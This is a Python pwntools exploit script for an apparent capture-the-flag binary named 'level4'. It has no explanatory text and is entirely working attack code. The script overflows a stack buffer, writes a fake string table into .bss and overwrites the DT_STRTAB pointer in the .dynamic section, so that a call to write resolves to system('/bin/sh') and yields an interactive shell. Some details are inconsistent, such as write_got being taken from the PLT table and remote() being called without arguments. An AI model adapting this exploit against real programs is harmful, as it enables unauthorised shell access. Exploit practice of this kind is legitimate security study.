#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from time import sleep
from sys import argv
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
if argv[1] == 'gdb' or argv[1] == 'l':
    io = process('./level4')
elif argv[1] == 'r':
    io = remote()
if argv[1] == 'gdb':
    gdb.attach(io, 'b * 0x8048454')
elf = ELF('./level4')
dynamic = 0x8049f14
bss = elf.bss()
read_plt = elf.plt['read']
write_plt = elf.plt['write']
write_got = elf.plt['write']
vuln = 0x8048350
# vuln = 0x804844b

padding = 'a' * (0x88 + 4)
'''
# rewrite write_got to write.pkt +6
payload = padding + flat(read_plt, vuln, 0, write_got, 4)
io.send(payload)
io.send(p32(write_plt + 6))
'''

# prepare bss + 0x100 as a fake string Table
fakeTable = '\x00libc.so.6\x00_IO_stdin_used\x00read\x00__libc_start_main\x00system\x00/bin/sh\x00GLIBC_2.0\x00'
payload = padding + flat(read_plt, vuln, 0, bss+0x100, len(fakeTable))
payload = payload.ljust(0x100, '\x00')
io.send(payload)
success('prepare 0x804a024 to fake strtab')
sleep(1)
io.send(fakeTable)

# change DT_STRTAB in .dynamic to fakeTable
payload = padding + flat(read_plt, vuln, 0, 0x8049f58, 4)
payload = payload.ljust(0x100, '\x00')
io.send(payload)
print 'change DTSTRTAB in .dynamic to fakeTable 0x8049f54:0x804822c ->' + hex(bss + 0x100)
sleep(1)
io.send(p32(bss + 0x100))

# call fake write to call system
payload = padding + flat(write_plt, 0xdeadbeef, bss+0x100+56)
payload = payload.ljust(0x100, '\x00')
io.send(payload)
print 'call fake write to call system'

io.interactive()
io.close()
